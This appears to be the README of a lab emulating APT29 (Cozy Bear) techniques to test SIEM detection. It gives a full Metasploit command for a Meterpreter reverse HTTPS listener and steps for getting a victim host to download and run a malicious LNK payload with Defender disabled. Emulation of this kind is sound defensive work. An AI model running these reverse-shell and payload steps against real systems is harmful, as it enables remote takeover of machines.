# APT29 Emulation — Cozy Bear

This directory contains the APT29 emulation scripts tested in a controlled lab environment. The goal is to reproduce the group's real techniques in an automated way to validate SIEM detection coverage.

---

## Prerequisites

Before running the emulation confirm you have the following ready:

- Kali Linux with Metasploit 6.4 or higher
- WIN-DC01 reachable on the network with Sysmon and Wazuh Agent active
- Metasploit listener running on port 443
- HTTP server running on port 8080
- Windows Defender disabled on WIN-DC01 (lab environment)

---

## Structure

```
03-emulation/
├── README.md           ← This file
├── auto-lnk.sh         ← Full LNK payload automation
└── lnk_payload.py      ← Malicious LNK file generator
```

---

## How to run

### Step 1 - Start the listener on Kali

Open a terminal and start the Metasploit listener:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.10.102; \
  set LPORT 443; \
  set ExitOnSession false; \
  run -j"
```

### Step 2 - Run the automation script

Open a second terminal and run:

```bash
chmod +x auto-lnk.sh
./auto-lnk.sh
```

The script generates the LNK payload, starts the HTTP server and waits for the victim to execute the file on WIN-DC01.

### Step 3 - Execute the payload on WIN-DC01

On WIN-DC01 open the browser and navigate to:

```
http://192.168.10.102:8080/ds7002.zip
```

Download and execute the LNK file. The Meterpreter session should open on Kali as `LAB\Administrator`.

### Step 4 - Execute the TTPs

With the active Meterpreter session execute the TTPs in the sequence documented in the [attack timeline](../02-attack-phases/attack-timeline-en.md).

---

## TTPs covered by this emulation

| TTP | Technique | Phase |
|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access |
| T1204.002 | Malicious File LNK | Initial Access |
| T1059.001 | PowerShell Execution | Execution |
| T1027 | Obfuscation | Defense Evasion |
| T1218.011 | Rundll32 | Defense Evasion |
| T1087 | Account Discovery | Discovery |
| T1069 | Permission Groups Discovery | Discovery |
| T1082 | System Information Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1012 | Registry Query | Discovery |
| T1560 | Archive Collected Data | Collection |
| T1105 | Ingress Tool Transfer | Command and Control |
| T1547.009 | Startup Persistence | Persistence |

---

## Important notes

This emulation was developed and tested exclusively in an isolated lab environment. Do not run these scripts on systems without explicit written authorisation.

Windows Defender must be disabled on the test endpoint for the payload to execute without being blocked. In a production environment Defender would block the payload which is the expected and desired behaviour.

---

## References

- [MAD20 APT29 Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
- [Metasploit Documentation](https://docs.metasploit.com/)
